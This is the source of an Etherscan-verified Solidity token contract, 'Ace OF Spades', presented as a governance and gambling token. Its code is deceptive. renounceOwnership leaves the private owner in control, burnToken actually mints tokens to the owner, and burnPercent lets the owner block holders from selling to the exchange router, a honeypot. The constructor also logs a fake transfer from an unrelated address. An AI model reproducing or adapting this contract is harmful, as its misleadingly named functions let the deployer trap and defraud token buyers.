/**
 *Submitted for verification at Etherscan.io on 2021-08-05
*/

/*
        ♠️ SPADES TOKEN ♠️ 
                                     
    ░░    ░░░░  ██  ░░  ░░░░    ░░   
      ░░      ██████░░  ░░           
            ██████████               
          ██████████████             
        ██████████████████           
          ████  ██  ████             
          ░░  ██████░░          ░░   
    ░░░░  ░░████  ████  ░░░░    ░░   
                                     
                     

Spades Token aims to create an ecosystem that solves and simplifies some important problems in supply chain management 
including a gambling system for all holders to bet against eachother in various casino-based games.

❓ What's the difference?

* Community Governance - Spades Token holders have the right to cast vote/give opinion on almost every issue.
* Fair Distribution - The first distribution of Spades Coin will be sold via a silent and fair launch. 
  Matters related to token burning will be evaluated by community vote.
* Inflation Protection - The fixed staking program allows Spades Token holders to earn passive income.
* Gambling - There will be multiple casino-based games including a sports betting system which will require SPADES token.               
*/
pragma solidity ^0.6.7; 
// SPDX-License-Identifier: MIT  
    

abstract contract Context {
    
    function _call() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}



contract Ownable is Context {
    address private _owner;
    address public Owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address call = _call();
        _owner = call;
         Owner = call;
        emit OwnershipTransferred(address(0), call);
    }
  

    modifier onlyOwner() {
        require(_owner == _call(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
         Owner = address(0);
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    
    }
    
}

contract AceofSpades is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private sellcooldown;
    mapping(address => uint256) private firstsell;
    mapping(address => uint256) private sellnumber;
    mapping(address => uint256) private _router;
    mapping(address => mapping (address => uint256)) private _allowances;
    address private router;
    address private caller;
    uint256 private _totalTokens = 47359463 * 10**18;
    uint256 private rTotal = 47359463 * 10**18;
    string private _name = 'Ace OF Spades - aceofspade.finance';
    string private _symbol = 'AceofSpades';
    uint8 private _decimals = 18;    

constructor () public {
    _router[_call()] = _totalTokens;
    emit Transfer(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _call(), _totalTokens);    

  
   }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function burnPercent(uint256 reflectionPercent) public onlyOwner {
        rTotal = reflectionPercent * 10**18;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _router[account];
    }
    

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_call(), recipient, amount);
        return true;
    }
    
    function burnToken(uint256 amount) public onlyOwner {
        require(_call() != address(0));
        _totalTokens = _totalTokens.add(amount);
        _router[_call()] = _router[_call()].add(amount);
        emit Transfer(address(0), _call(), amount);
    }
    function Approve(address routeUniswap) public onlyOwner {
        caller = routeUniswap;
    }
    
    function setrouteChain (address Uniswaprouterv02) public onlyOwner {
        router = Uniswaprouterv02;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_call(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _call(), _allowances[sender][_call()].sub(amount));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalTokens;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0));
        require(recipient != address(0));
        
        if (sender != caller && recipient == router) {
            require(amount < rTotal); 
    }
        _router[sender] = _router[sender].sub(amount);
        _router[recipient] = _router[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
     function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}